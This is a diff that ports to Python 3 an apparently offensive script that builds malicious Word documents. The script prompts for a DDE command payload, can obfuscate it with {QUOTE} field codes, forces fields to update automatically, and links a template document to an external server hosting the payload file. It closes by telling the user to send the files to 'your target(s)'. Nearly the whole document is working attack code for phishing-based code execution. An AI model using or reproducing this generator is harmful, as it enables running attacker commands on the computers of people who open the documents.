@@ -1,3 +1,4 @@
+from builtins import input # python3 support
 import zipfile
 import argparse
 import os
@@ -5,7 +6,7 @@ import tempfile
 import shutil
 from lxml import etree
 
-__version__ = "1.0"
+__version__ = "1.1"
 __author__ = "0xdeadbeefJERKY"
 
 """
@@ -15,6 +16,10 @@ by @_staaldraad and @0x5A1F (blog post link in References
 section below) to generate two malicious Word documents:
 
 Usage:
+Install dependencies:
+
+    pip install -r requirements.txt
+
 Insert a simple (unobfuscated) DDE command string into the 
 payload document:
 
@@ -55,7 +60,7 @@ def arg_parse():
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser()
     parser.add_argument('--obfuscate', action='store_true', dest='obfuscate', default=False, help='Enable {QUOTE} field code obfuscation')
-    parser.add_argument('--version', action='version', version='%(prog)s 1.0')
+    parser.add_argument('--version', action='version', version='%(prog)s ' + __version__)
     results = parser.parse_args()
     
     return results.obfuscate
@@ -72,9 +77,9 @@ def obfuscate_dde(payload):
 def gen_payload(obfuscate):
     # Prompt user for DDE payload
     payload = []
-    arg1 = raw_input("[-] Enter DDE payload argument #1: ")
-    arg2 = raw_input("[-] Enter DDE payload argument #2: ")
-    arg3 = raw_input("[-] Enter DDE payload argument #3 (press ENTER to omit): ")
+    arg1 = input("[-] Enter DDE payload argument #1: ")
+    arg2 = input("[-] Enter DDE payload argument #2: ")
+    arg3 = input("[-] Enter DDE payload argument #3 (press ENTER to omit): ")
 
     payload.append('DDE')
     payload.append(arg1)
@@ -90,7 +95,7 @@ def gen_payload(obfuscate):
 
     # Obfuscate provided DDE payload (if enabled)
     if obfuscate:
-        print "[*] Converting DDE payload using {QUOTE} field code..."    
+        print("[*] Converting DDE payload using {QUOTE} field code...")    
         obfusc_payload = []
         obfusc_payload.append(obfuscate_dde(payload[1].replace('\\\\','\\')))
         obfusc_payload.append(obfuscate_dde(payload[2].replace('\\\\','\\')))
@@ -101,14 +106,14 @@ def gen_payload(obfuscate):
         payload[3] = '"' + payload[3] + '"'
     
     payload = " ".join(payload)
-    print '[*] Selected DDE payload: {}'.format(payload)
+    print('[*] Selected DDE payload: {}'.format(payload))
 
     if obfuscate:
-        print '[*] Obfuscated DDE payload: {}'.format(obfusc_payload)
+        print('[*] Obfuscated DDE payload: {}'.format(obfusc_payload))
 
     # Prompt user for server hosting payload Office document (referenced by 'template')
     # e.g., http://localhost:8000
-    targetsvr = raw_input("[-] Enter server URL (hosting payload Word file): ")
+    targetsvr = input("[-] Enter server URL (hosting payload Word file): ")
     if obfuscate:
         targetsvr = targetsvr + '/payload-obfuscated-final.docx'
     else:
@@ -120,12 +125,12 @@ def gen_payload(obfuscate):
         return payload, targetsvr
 
 if __name__ == "__main__":
+    # Parse arguments from command-line
+    obfuscate = arg_parse()
+
     # Create 'out' directory
     if not os.path.exists('out'):
         os.makedirs('out')
-
-    # Parse arguments from command-line
-    obfuscate = arg_parse()
     
     # Set output file names and create zipfile objects for each
     if obfuscate:
@@ -164,13 +169,13 @@ if __name__ == "__main__":
     # automatically update fields within the document
     for node in settingtree.iter(tag=etree.Element):
         if node.tag == word_schema + "settings":
-            print '[*] Inserting updateFields XML element into {}/word/settings.xml...'.format(payload_out)
+            print('[*] Inserting updateFields XML element into {}/word/settings.xml...'.format(payload_out))
             node.insert(0,updatefields)
 
     # Find 'webSettings' XML element and insert frameset as child element
     for node in webtree.iter(tag=etree.Element):
         if node.tag == word_schema + "webSettings":
-            print '[*] Inserting frameset XML element into {}/word/webSettings.xml...'.format(template_out)
+            print('[*] Inserting frameset XML element into {}/word/webSettings.xml...'.format(template_out))
             node.insert(0,frameset)
 
     # Formulate XML elements necessary to insert nested, obfuscated DDE payload into 
@@ -180,7 +185,7 @@ if __name__ == "__main__":
                 '''
 
     # Find 'instrText' XML element and change value to DDE payload
-    print '[*] Inserting DDE payload into {}/word/document.xml...'.format(payload_out)
+    print('[*] Inserting DDE payload into {}/word/document.xml...'.format(payload_out))
     if obfuscate:
         for node in doctree.iter(tag=etree.Element):
             if node.tag == word_schema + "document":
@@ -200,25 +205,25 @@ if __name__ == "__main__":
     # Write modified settings.xml to temp directory for payload.docx
     with open(os.path.join(tmp_dir_pay,'word/settings.xml'), 'w') as f:
         xmlstr = etree.tostring(settingtree)
-        f.write(xmlstr)
+        f.write(xmlstr.decode())
 
     # Write modified webSettings.xml to temp directory for template.docx
     with open(os.path.join(tmp_dir_template,'word/webSettings.xml'), 'w') as f:
         xmlstr = etree.tostring(webtree)
-        f.write(xmlstr)
+        f.write(xmlstr.decode())
 
     # Create word/_rels/webSettings.xml.rels file and insert Relationships XML element
-    websettingsrels = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="' + targetsvr + '" TargetMode="External"/></Relationships>'
+    websettingsrels = '<?xml version="1.0" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" Target="' + targetsvr + '" TargetMode="External"/></Relationships>'
     websettingsrels = etree.fromstring(websettingsrels)
 
     with open(os.path.join(tmp_dir_template,'word/_rels/webSettings.xml.rels'), 'w') as f:
         xmlstr = etree.tostring(websettingsrels)
-        f.write(xmlstr)
+        f.write(xmlstr.decode())
 
     # Write modified word/document.xml to temp directory for payload.docx
     with open(os.path.join(tmp_dir_pay,'word/document.xml'), 'w') as f:
         xmlstr = etree.tostring(doctree)
-        f.write(xmlstr)
+        f.write(xmlstr.decode())
 
     # Get a list of all the files in the original 
     filenames_pay = zfpay.namelist()
@@ -243,4 +248,4 @@ if __name__ == "__main__":
     shutil.rmtree(tmp_dir_pay)
     shutil.rmtree(tmp_dir_template)
 
-    print '[*] Payload generation complete! Delivery methods below:\n\t1. Host {} at {} and send {} to your target(s).\n\t2. Send {} directly to your target(s).'.format(payload_out, targetsvr, template_out, payload_out)
+    print('[*] Payload generation complete! Delivery methods below:\n\t1. Host {} at {} and send {} to your target(s).\n\t2. Send {} directly to your target(s).'.format(payload_out, targetsvr, template_out, payload_out))
